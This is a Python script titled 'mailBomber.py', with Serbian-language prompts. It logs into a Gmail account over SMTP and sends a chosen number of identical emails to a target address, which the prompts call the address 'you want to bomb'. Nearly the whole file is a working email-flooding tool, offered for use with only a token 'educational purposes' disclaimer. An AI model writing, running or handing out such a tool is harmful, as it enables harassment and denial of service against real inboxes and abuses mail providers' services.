#!/usr/bin/env python3

__coder__ = 'Ivica Lazarevic'
__scriptName__ = 'mailBomber.py'
__version__ = '0.1'
__site__ = 'pythonbytes.rs'

import sys
import smtplib
from subprocess import call

try:
    from colorama import Fore
except:
    call('pip3 install colorama', shell=True)
    exit()


def logo():
    print(Fore.RED+"\n       __           __        ____      __        ")
    print(Fore.RED+"  ____/ /___ ______/ /_______/ __ \____/ /__  _____ ")
    print(Fore.RED+" / __  / __ `/ ___/ //_/ ___/ / / / __  / _ \/ ___/ ")
    print(Fore.RED+"/ /_/ / /_/ / /  / ,< / /__/ /_/ / /_/ /  __/ /     ")
    print(Fore.RED+"\__,_/\__,_/_/  /_/|_|\___/\____/\__,_/\___/_/      ")
    print(Fore.RED+"                                                \n")
    print(Fore.RED+'                               Naziv: '+ __scriptName__)
    print(Fore.RED+'                               Verzija: '+ __version__)
    print(Fore.RED+'                               Koder: '+ __coder__)
    print(Fore.RED+ '                               Sajt: ' + __site__+Fore.WHITE)

if sys.platform == 'linux' or sys.platform == 'linux2' or sys.platform == 'darwin':
    call('clear', shell=True)
    logo()
else:
    call('cls', shell=True)
    logo()

def gmailBomber(vasNalog, vasaLozinka, gmailSmtp, gmailPort, brojMejlova, tekstMejla, metaMejl):
    smtpServer = smtplib.SMTP(gmailSmtp, gmailPort)
    smtpServer.ehlo()
    smtpServer.starttls()

    try:
        smtpServer.login(vasNalog, vasaLozinka)
        print(f'\n[+] Uspeli smo da se ulogujemo u Gmail nalog!\n')
    except smtplib.SMTPAuthenticationError:
        exit('\n[-] Proverite da li ste tacno uneli vas Gmail nalog i lozinku!')

    broj = 0
    while broj < brojMejlova:
        smtpServer.sendmail(vasNalog, metaMejl, tekstMejla)
        broj += 1
        print(f'Mejl broj {broj} poslat!')

    print(f'\n[+] Ukupno poslato mejlova: {broj}')



if __name__ == '__main__':
    print('\n[+] Dobrodosli u Mail Bomber!')
    print('[!] Napisano u edukativne svrhe, koristiti na svoju odgovornost!!!')

    SMTP_SERVER = 'smtp.gmail.com'
    SMTP_PORT = 587

    ###########################
    VAS_MEJL = 'NALOG SA KOG SALJETE MEJLOVE'
    VASA_LOZINKA = 'LOZINKA OD NALOGA SA KOG SALJETE MEJLOVE'
    ###########################
    if '@gmail.com' not in VAS_MEJL:
        exit(f'\n[-] Uneli ste {VAS_MEJL}, molimo vas prijavite se preko Gmail naloga!')
    META_MEJL = input('\n[+] Molimo vas unesite mejl koji zelite da bombardujete: ')
    BROJ_MEJLOVA = int(input('[+] Molimo vas unesite broj mejlova za slanje: '))
    NASLOV_PORUKE = input('[+] Molimo vas unesite naslov mejla(subject): ')
    TEKST_PORUKE = input('[+] Molimo vas unesite tekst koji se salje: ')

    CEO_MEJL = f'''\
    From: {VAS_MEJL}
    To: {META_MEJL}
    Subject: {NASLOV_PORUKE}

    {TEKST_PORUKE}'''

    provera = input(f'''\n[+] Proverite da li su ispravni sledeci podaci:

    SMTP Server = {SMTP_SERVER}
    SMTP Port = {SMTP_PORT}
    Vas Mejl = {VAS_MEJL}
    Vasa Lozinka = {VASA_LOZINKA}
    Mejl koji se bombarduje = {META_MEJL}
    Broj mejlova za slanje = {BROJ_MEJLOVA}
    Subject mejla = {NASLOV_PORUKE}
    Tekst mejla = {TEKST_PORUKE}
    
    [!] Da li su ovo podaci koje ste uneli? (y/n): ''')

    if provera not in ['y', 'n']:
        exit('[-] Molimo vas ukucajte y za potvrdu ili n za izlaz iz skripte!')

    if provera == 'n':
        exit('\n[-] Hvala vam sto ste koristili skriptu!')

    else:
        gmailBomber(VAS_MEJL, VASA_LOZINKA, SMTP_SERVER, SMTP_PORT, BROJ_MEJLOVA, CEO_MEJL, META_MEJL)



